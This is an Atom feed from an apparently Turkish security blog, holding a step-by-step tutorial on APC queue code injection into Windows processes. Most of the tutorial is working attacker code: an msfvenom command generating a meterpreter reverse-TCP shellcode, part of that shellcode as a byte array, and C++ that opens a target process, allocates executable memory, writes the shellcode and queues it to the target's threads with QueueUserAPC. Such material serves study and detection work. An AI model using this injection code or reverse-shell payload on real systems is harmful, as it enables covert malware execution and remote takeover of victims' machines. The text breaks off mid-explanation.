<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-08-28T08:57:11+03:00</updated><id>http://localhost:4000/</id><title type="html">Daily Security</title><subtitle>In this blog we're going to solve CTF's &amp; Write Some Software's.My goal is redirect my little knowledge to other people.</subtitle><entry><title type="html">APC Queue Code Injection</title><link href="http://localhost:4000/2019/08/27/APC-Queue-Code-Injection.html" rel="alternate" type="text/html" title="APC Queue Code Injection" /><published>2019-08-27T00:00:00+03:00</published><updated>2019-08-27T00:00:00+03:00</updated><id>http://localhost:4000/2019/08/27/APC-Queue-Code-Injection</id><content type="html" xml:base="http://localhost:4000/2019/08/27/APC-Queue-Code-Injection.html">&lt;h1 id=&quot;introduction-to-apc-thread-and-apc-code-injection&quot;&gt;Introduction to APC, Thread and APC Code Injection&lt;/h1&gt;

&lt;p&gt;Bu yazımda  bir &lt;strong&gt;APC (Asynchronous Procedure Call)&lt;/strong&gt;‘nin ne olduğundan bahsedeceğim. İnternet’te türkçe olarak böyle bir &lt;strong&gt;Code Injection&lt;/strong&gt; tekniğinin açıklaması ve örnekleri yapıldımı diye baktığımda hiç bir kaynak bulamadım. Bu yüzdende ben yazmaya karar verdim.&lt;/p&gt;

&lt;p&gt;Yazının ileriki kısımlarında &lt;strong&gt;Code Injection&lt;/strong&gt; gerçekleştirmek için gerekli olan yazılımı &lt;strong&gt;step-by-step&lt;/strong&gt; yani adım adım geliştireceğiz. İlk başlarda sıkıcı-anlaşılmaz gelebilir yalnız tüm anlatım birbiri ile bağlı. Kısaca &lt;strong&gt;giriş-gelişme&lt;/strong&gt; sıkabilir bu yüzden &lt;strong&gt;sonuç&lt;/strong&gt;‘u bekleyelim.&lt;/p&gt;

&lt;p&gt;Yazı hakkında kısa bir özet geçmek gerekirse :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;APC&lt;/strong&gt; bir fonksiyondur&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Eşzamansız&lt;/strong&gt; yani &lt;strong&gt;Asynchronously&lt;/strong&gt; çalışan bir fonksiyondur.&lt;/li&gt;
  &lt;li&gt;Bu fonksiyon &lt;strong&gt;Thread&lt;/strong&gt;‘lerin içeriğinde çalışmaktadır.&lt;/li&gt;
  &lt;li&gt;Biz bu tekniği kullanarak &lt;strong&gt;Process&lt;/strong&gt;‘ler içerisine &lt;strong&gt;Kod&lt;/strong&gt; enjekte edebiliyoruz.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Bahsettiğim &lt;strong&gt;Code Injection&lt;/strong&gt; tekniğinin daha önce birçok &lt;strong&gt;Zararlı Yazılım&lt;/strong&gt; tarafından kullanıldığını gördük. Örneğin :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Carberp&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;DorkBot&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Aynı zamanda da &lt;a href=&quot;https://www.fireeye.com/blog/threat-research/2017/09/apt33-insights-into-iranian-cyber-espionage.html&quot;&gt;APT33&lt;/a&gt; tarafından geliştirilen &lt;strong&gt;TurnedUp&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Bu &lt;strong&gt;zararlı yazılım&lt;/strong&gt;‘lar içerisinde &lt;strong&gt;APC Queue Code Injection&lt;/strong&gt; tekniği mevcut.&lt;/p&gt;

&lt;p&gt;Yani kısaca anlatmak istediğim popüler bir teknik olduğundan aynı zamanda da bazı &lt;strong&gt;Anti-malware&lt;/strong&gt; ve &lt;strong&gt;EDR (Endpoint Detection and Response)&lt;/strong&gt; yazılımları tarafından farkedildiğinden, bir &lt;strong&gt;Saldırı&lt;/strong&gt; tekniği olarak sıkça kullanılmasını tavsiye etmiyorum.&lt;/p&gt;

&lt;h3 id=&quot;apc-nedir-&quot;&gt;APC Nedir ?&lt;/h3&gt;

&lt;p&gt;Yukarıda basit bir özetini geçtim ama yine de teknik açıdan anlatmakta fayda var.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Asynchronous Procedure Call (APC)&lt;/strong&gt;, &lt;strong&gt;Eşzamansız (Asynchronously)&lt;/strong&gt; olarak çalışan, aynı zamanda da &lt;strong&gt;Thread&lt;/strong&gt; içeriğinde çalışmakta olan bir fonksiyondur.&lt;/p&gt;

&lt;p&gt;Bir &lt;strong&gt;APC&lt;/strong&gt;, &lt;strong&gt;Thread&lt;/strong&gt; içerisine sunulduğu zaman sistem &lt;strong&gt;Software Interrupt&lt;/strong&gt; adında bir hata alır. Dolayısı ile &lt;strong&gt;Thread&lt;/strong&gt; tekrar yüklendiğinde ya da çalıştığında o &lt;strong&gt;Thread&lt;/strong&gt; bizim &lt;strong&gt;APC&lt;/strong&gt; fonksiyonumuzu çalıştırır.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;System&lt;/strong&gt; tarafından oluşturulan bir &lt;strong&gt;APC&lt;/strong&gt;‘ye &lt;strong&gt;kernel-mode APC&lt;/strong&gt; denilir.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Application&lt;/strong&gt; tarafından oluşturulan bir &lt;strong&gt;APC&lt;/strong&gt;‘ye ise &lt;strong&gt;user-mode APC&lt;/strong&gt; denilmektedir.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Bir &lt;strong&gt;user-mode APC&lt;/strong&gt;‘nin &lt;strong&gt;Thread&lt;/strong&gt; içerisinde çalışması için &lt;strong&gt;Thread&lt;/strong&gt;‘in bir &lt;strong&gt;Alertable State&lt;/strong&gt; içerisinde olması lazımdır çünkü &lt;strong&gt;alertable I/O&lt;/strong&gt; dediğimiz olay &lt;strong&gt;asynchronous I/O request&lt;/strong&gt;‘lerini &lt;strong&gt;process&lt;/strong&gt; eder.&lt;/p&gt;

&lt;p&gt;Dolayısı ile bir &lt;strong&gt;Thread&lt;/strong&gt; eğer &lt;strong&gt;Alertable State&lt;/strong&gt; içerisinde olmazsa bir &lt;strong&gt;asynchronous I/O&lt;/strong&gt; requesti olan &lt;strong&gt;APC&lt;/strong&gt; fonksiyonunu &lt;strong&gt;çalıştıramaz&lt;/strong&gt; yani &lt;strong&gt;process&lt;/strong&gt; edemez.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Alertable I/O&lt;/strong&gt; ve &lt;strong&gt;APC&lt;/strong&gt;‘nin gerekli ilişkisini  &lt;strong&gt;Windows&lt;/strong&gt; tarafından yazılan bu dökümanda daha detaylı öğrenebilirsiniz : &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/fileio/alertable-i-o&quot;&gt;Alertable I/O&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Aklı biraz açıkgözlülüğe çalışanın aklına hemen şu soru gelecektir :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Yani biz eğer process’in içerisinde bulunan thread’e bir APC fonksiyonu gönderirsek ve bu APC fonksiyonu bizim shellcode’umuzu içerirse bu bir APC Queue Code Injection sayılır değil mi ?&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Vereceğim bu cevap ile blog yazısının tüm sihrini kaçıracağım ama yinede okuyanlar için heycanlandırıcı bir yazı olmasını istediğimden bu sorunun cevabıda &lt;strong&gt;Evet&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;apc-queue-code-injection&quot;&gt;APC Queue Code Injection&lt;/h3&gt;

&lt;p&gt;Yazdığımız kodu tek tek anlatmaya başlamadan önce &lt;strong&gt;APC&lt;/strong&gt;, &lt;strong&gt;Thread&lt;/strong&gt;, &lt;strong&gt;Queue&lt;/strong&gt; gibi terimleri daha iyi anlaşılması adına tekrar anlatalım.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;**APC (Asynchronous Procedure Call) **  : Asenkron (Eşzamansız) olarak çalışan bir fonksiyondur.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Thread&lt;/strong&gt; : Bir &lt;strong&gt;Process&lt;/strong&gt; yani çalışan bir program içerisinde birden fazla işlemi aynı zamanda gerçekleştirmek istersek oluşturacağımız &lt;strong&gt;Birim&lt;/strong&gt; yani &lt;strong&gt;Unit&lt;/strong&gt;‘tir.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;APC Queue to Thread&lt;/strong&gt; : &lt;strong&gt;Thread&lt;/strong&gt; içerisine çalıştırılacak olan fonksiyonu sunmaktır.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Daha da basiti eğer biz bir &lt;strong&gt;Thread&lt;/strong&gt; içerisine oluşturduğumuz &lt;strong&gt;APC&lt;/strong&gt; fonksiyonunu (bu bir shellcode’da olabilir) eklediğimizde &lt;strong&gt;Thread&lt;/strong&gt; hata verip sonraki çalışma esnasında bizim fonksiyonumuzu çalıştıracağından &lt;strong&gt;process&lt;/strong&gt; içerisinde oluşturulan &lt;strong&gt;birim&lt;/strong&gt;‘leri kontrol edebileceğizdir.&lt;/p&gt;

&lt;p&gt;Bu yukarıda anlattığımı kavrayamayan olduysa hiç sorun değil aşağıdaki resim tam olarak &lt;strong&gt;APC Queue Code Injection&lt;/strong&gt; tekniğinin nasıl çalıştığını çok basit gözler önüne seriyor.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/3OgLzp.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Resimi biraz daha adım adım açmak gerekir ise :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Bir &lt;strong&gt;Process&lt;/strong&gt; oluşturuluyor.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Process&lt;/strong&gt; içerisinde alan(memory) ayrılıyor.&lt;/li&gt;
  &lt;li&gt;Bu alana &lt;strong&gt;Zararlı Kod&lt;/strong&gt; enjekte ediliyor.&lt;/li&gt;
  &lt;li&gt;Enjekte edilen bu &lt;strong&gt;Zararlı Kod&lt;/strong&gt; bir &lt;strong&gt;APC&lt;/strong&gt; fonksiyonunun başlangıç adresine veriliyor.&lt;/li&gt;
  &lt;li&gt;Ve bu şekilde &lt;strong&gt;APC&lt;/strong&gt; fonksiyonu &lt;strong&gt;Zararlı Kod&lt;/strong&gt;‘u çalıştırıyor.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Şimdi bir &lt;strong&gt;Saldırgan&lt;/strong&gt; ve &lt;strong&gt;Kurban&lt;/strong&gt; yazılımı oluşturacağız. Ve bu sayede &lt;strong&gt;Kurban&lt;/strong&gt;‘ın çalıştırdığı &lt;strong&gt;APC&lt;/strong&gt; fonksiyonuna bizim &lt;strong&gt;Shellcode&lt;/strong&gt;‘umuzu enjekte edeceğiz.&lt;/p&gt;

&lt;p&gt;Öncelikle &lt;strong&gt;Kurban&lt;/strong&gt; kodunu geliştirelim ve içeriğini biraz daha açıklayalım.&lt;/p&gt;

&lt;h3 id=&quot;victim-code&quot;&gt;Victim Code&lt;/h3&gt;

&lt;p&gt;Öncelikle kütüphanelerimizi ekleyelim :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;Windows.h&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Main&lt;/strong&gt; fonksiyonunu oluşturalım ve içerisinde bir adet &lt;strong&gt;APC&lt;/strong&gt; fonksiyonunu çalıştıralım.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int main()
{
    std::cout &amp;lt;&amp;lt; &quot;Entering alertable state...\n&quot;;
		SleepEx(1000 * 60, true);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Basit bir şekilde kodumuz bu. Şimdi birazdan &lt;strong&gt;Saldırgan&lt;/strong&gt; kodunu geliştirmeye başladığımızda bu kısmı daha iyi anlayacağız.&lt;/p&gt;

&lt;p&gt;Buradaki &lt;strong&gt;SleepEx&lt;/strong&gt; fonksiyonu bir &lt;strong&gt;APC&lt;/strong&gt; fonksiyonudur.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Windows&lt;/strong&gt; tarafından oluşturulan bu &lt;strong&gt;APC&lt;/strong&gt; dökümanında hangi fonksiyonlar mevcut bakarsanız &lt;strong&gt;SleepEx&lt;/strong&gt;‘i görebilirsiniz tabi onun dışında bir çok &lt;strong&gt;APC&lt;/strong&gt; fonksiyonu mevcut :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls&quot;&gt;Asynchronous Procedure Calls&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Birazdan yapacağımız şey basitçe &lt;strong&gt;SleepEx&lt;/strong&gt; fonksiyonunun başlangıç adresine bizim oluşturacağımız &lt;strong&gt;Shellcode&lt;/strong&gt;‘u ekleyeceğiz. Dolayısıyla bu &lt;strong&gt;Kurban&lt;/strong&gt; yazılım çalıştığında bizim &lt;strong&gt;Zararlı Kod&lt;/strong&gt;‘umuzu çalıştıracak.&lt;/p&gt;

&lt;h3 id=&quot;attacker-code&quot;&gt;Attacker Code&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Saldırgan&lt;/strong&gt; kodunu geliştirmeye başlamadan önce alttaki parametreler aracığılıyla &lt;strong&gt;MSFVenom&lt;/strong&gt; kullanarak bir &lt;strong&gt;Shellcode&lt;/strong&gt; oluşturduğunuzu varsayıyorum.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx EXITFUNC=thread -f c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Öncelikle kütüphanelerimizi ekleyelim :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;Windows.h&amp;gt;
#include &amp;lt;TlHelp32.h&amp;gt;
#include &amp;lt;vector&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Main&lt;/strong&gt; fonksiyonunu oluşturalım :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int main()
{
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Saldırgan&lt;/strong&gt;‘ın kodu biraz uzun olduğundan adım adım ilerleyeceğiz. Kodu tamamen anlattıktan sonra &lt;strong&gt;Pastebin&lt;/strong&gt; linkini vereceğim kendiniz derleyip çalıştırmak isterseniz diye.&lt;/p&gt;

&lt;p&gt;Şimdi &lt;strong&gt;Shellcode&lt;/strong&gt;‘umuzu bir değişkene atayalım :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unsigned char shellcode[] = &quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;
		&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;
		&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;
		&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;
		&quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;
		&quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;
		&quot;\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b&quot;
		&quot;\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;APC&lt;/strong&gt; içeren &lt;strong&gt;Zararlı Kod&lt;/strong&gt;‘u enjekte edeceğimiz &lt;strong&gt;Process&lt;/strong&gt;‘in &lt;strong&gt;Snapshot&lt;/strong&gt;‘unu alacağımız değişkeni oluşturalım :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Kurban&lt;/strong&gt; yazılımı içeren &lt;strong&gt;Process&lt;/strong&gt;‘i tutacak değişkeni oluşturalım :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HANDLE victimProcess = NULL;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hekleyeceğimiz &lt;strong&gt;Process&lt;/strong&gt;‘in kayıtlarını tutacak olan &lt;strong&gt;processEntry&lt;/strong&gt;‘i ve hekleyeceğimiz &lt;strong&gt;Thread&lt;/strong&gt;‘in kayıtlarını tutacka olan &lt;strong&gt;threadEntry&lt;/strong&gt;‘i oluşturalım :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hekleyeceğimiz &lt;strong&gt;Process&lt;/strong&gt;‘in içerdiği &lt;strong&gt;Thread&lt;/strong&gt;‘ların &lt;strong&gt;ID&lt;/strong&gt;‘lerini tutacak değişkeni oluşturalım :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;std::vector&amp;lt;DWORD&amp;gt; threadIds;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Shellcode&lt;/strong&gt;‘un boyutunu tutacak değişkeni oluşturalım :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SIZE_T shellcodeSize = sizeof(shellcode);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sonradan içini açacağımız &lt;strong&gt;Thread&lt;/strong&gt;‘i bize tutacak olan &lt;strong&gt;threadHandle&lt;/strong&gt; değişkenini oluşturalım :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HANDLE threadHandle = NULL;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Aşşağıdaki &lt;strong&gt;Kod&lt;/strong&gt; basit bir şekilde şuanda bilgisayarınzda mevcut çalışan &lt;strong&gt;Process&lt;/strong&gt;‘lerin dosya ismi ile bizim &lt;strong&gt;Kurban&lt;/strong&gt; dosya ismini karşılaştırıp sonrada bulduğunda &lt;strong&gt;processEntry&lt;/strong&gt;‘ye kaydediyor.&lt;/p&gt;

&lt;p&gt;Daha da basit şekilde &lt;strong&gt;Kurban&lt;/strong&gt; yazılımı bulup bu yazılımın &lt;strong&gt;Process&lt;/strong&gt; kayıtlarını &lt;strong&gt;processEntry&lt;/strong&gt;‘ye ekliyor. Bu şekilde de &lt;strong&gt;yazılım&lt;/strong&gt; üzerinde düzenleme ya da içerik görme gerçekleştirebileceğiz. Örneğin &lt;strong&gt;Kurban&lt;/strong&gt; yazılımın &lt;strong&gt;Process ID&lt;/strong&gt;‘sini görmek gibi vs….&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (Process32First(snapshot, &amp;amp;processEntry)) {
		while (_wcsicmp(processEntry.szExeFile, L&quot;testtt1.exe&quot;) != 0) {
			Process32Next(snapshot, &amp;amp;processEntry);
		}
	}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Kurban&lt;/strong&gt; yazılımı &lt;strong&gt;PROCESS_ALL_ACCESS&lt;/strong&gt; değeri ile tüm erişime sahip şekilde &lt;strong&gt;OpenProcess&lt;/strong&gt; fonksiyonu aracığılıyla açıyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;victimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sonra &lt;strong&gt;Kurban&lt;/strong&gt; yazılımın içine &lt;strong&gt;VirtualAllocEx&lt;/strong&gt; fonksiyonu aracılığı ile enjekte edeceğimiz &lt;strong&gt;Shellcode&lt;/strong&gt;‘un boyutu kadar alan ayırıyoruz.&lt;/p&gt;

&lt;p&gt;Ayırdığımız alanın &lt;strong&gt;Adresini&lt;/strong&gt;‘de &lt;strong&gt;shellcodeAddr&lt;/strong&gt; değişkenine atıyoruz :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LPVOID shellcodeAddr = VirtualAllocEx(victimProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;apcRoutine&lt;/strong&gt; değişkeni içerisine &lt;strong&gt;Shellcode&lt;/strong&gt; adresimizi atıyoruz.&lt;/p&gt;

&lt;p&gt;Bu kısımda kafanız karışmasın bu &lt;strong&gt;değişken&lt;/strong&gt;‘in ileride ne yaptığını daha iyi anlayacağız :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellcodeAddr;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;VirtualAllocEx&lt;/strong&gt; ile &lt;strong&gt;Kurban&lt;/strong&gt; yazılımı içerisinde ayırdığımız alana &lt;strong&gt;WriteProcessMemory&lt;/strong&gt; fonksiyonu ile bizim &lt;strong&gt;Shellcode&lt;/strong&gt; yani &lt;strong&gt;Zararlı Kod&lt;/strong&gt;‘umuzu yazıyoruz.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;WriteProcessMemory(victimProcess, shellcodeAddr, shellcode, shellcodeSize, NULL);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Aşağıda ki &lt;strong&gt;if&lt;/strong&gt; karşılaştırması ile &lt;strong&gt;threadEntry&lt;/strong&gt;‘nin &lt;strong&gt;Process&lt;/strong&gt; içerisinden aldığımız &lt;strong&gt;Snapshot&lt;/strong&gt; ile uyumluluğunu sorguluyoruz.&lt;/p&gt;

&lt;p&gt;Ve sonraki &lt;strong&gt;do-while&lt;/strong&gt; döngüsünde bizim &lt;strong&gt;threadEntry&lt;/strong&gt; içerisindeki &lt;strong&gt;Process ID&lt;/strong&gt;‘si ile &lt;strong&gt;processEntry&lt;/strong&gt; içerisindeki &lt;strong&gt;Process ID&lt;/strong&gt;‘nin aynı olup olmadığını karşılaştırıyoruz.&lt;/p&gt;

&lt;p&gt;Eğer aynı ise başta oluşturduğumuz &lt;strong&gt;threadIDs&lt;/strong&gt; değişkenine &lt;strong&gt;Process&lt;/strong&gt; içerisinde bulunan &lt;strong&gt;Thread&lt;/strong&gt; yani çalışan &lt;strong&gt;Birimler&lt;/strong&gt; tek tek ekleniyor.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (Thread32First(snapshot, &amp;amp;threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
				threadIds.push_back(threadEntry.th32ThreadID);
			}
		} while (Thread32Next(snapshot, &amp;amp;threadEntry));
	}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Şimdi bu &lt;strong&gt;Saldırgan&lt;/strong&gt; kodunun en önemli kısmına geldik.&lt;/p&gt;

&lt;p&gt;Aşşağıdaki kod basit bir şekilde şunları yapıyor :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;for&lt;/strong&gt; döngüsü ile yukarıda anlattığımız &lt;strong&gt;do-while&lt;/strong&gt; döngüsünden çıkan &lt;strong&gt;Thread ID&lt;/strong&gt;‘leri alınıyor.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;printf&lt;/strong&gt; ile bu &lt;strong&gt;Thread ID&lt;/strong&gt;‘ler ekrana yazılıyor.&lt;/li&gt;
  &lt;li&gt;Her döngü çalıştığında mevcut olan &lt;strong&gt;Thread&lt;/strong&gt; tüm yetkilerle yani &lt;strong&gt;THREAD_ALL_ACCESS&lt;/strong&gt; ile &lt;strong&gt;OpenThread&lt;/strong&gt; fonksiyonu kullanılarak &lt;strong&gt;threadHandle&lt;/strong&gt; değişkenin içerisine aktarılıyor.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;En önemli bölüme geldik &lt;strong&gt;QueueUserAPC&lt;/strong&gt;. Bu fonksiyon basit bir şekilde bizim başta içerisine &lt;strong&gt;Shellcode&lt;/strong&gt; adresimizi aktardığımız &lt;strong&gt;apcRoutine&lt;/strong&gt; değişkenini alıyor ilk parametre olarak.&lt;/p&gt;

&lt;p&gt;İkinci paramterle olarakta bir üstünde belirttiğimiz &lt;strong&gt;threadHandle&lt;/strong&gt; değişkenini alıyor yani her döngüde yenilenen &lt;strong&gt;Kurban&lt;/strong&gt; yazılım içerisinde bulunan &lt;strong&gt;Thread&lt;/strong&gt;‘leri.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;for (DWORD threadId : threadIds) {
		printf(&quot;Thread : 0x%08x\n&quot;, threadId);
		threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
		QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
		getchar();
	}
	
return 0;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bu fonksiyonun basitçe yaptığı şu &lt;strong&gt;Shellcode&lt;/strong&gt; adresimizi bir &lt;strong&gt;APC&lt;/strong&gt; fonksiyonu olarak görüyor ve bunu &lt;strong&gt;Kurban&lt;/strong&gt; yazılım içerisinde çalışan &lt;strong&gt;Thread&lt;/strong&gt;‘lerden birine atıyor.&lt;/p&gt;

&lt;p&gt;Dolayısı ile &lt;strong&gt;Thread&lt;/strong&gt; bizim &lt;strong&gt;Shellcode&lt;/strong&gt;‘umuzu çalıştırıyor.&lt;/p&gt;

&lt;p&gt;Tabi diyebilirsiniz ki &lt;strong&gt;Hangi thread’ı kullanması gerektiğini nereden biliyor ?&lt;/strong&gt; diye. Çok güzel bir soru.&lt;/p&gt;

&lt;p&gt;Seçtiği &lt;strong&gt;Thread&lt;/strong&gt;‘ın içeriği bir &lt;strong&gt;Alertable State&lt;/strong&gt; içeren &lt;strong&gt;APC&lt;/strong&gt; fonksiyonu olmak zorunda.&lt;/p&gt;

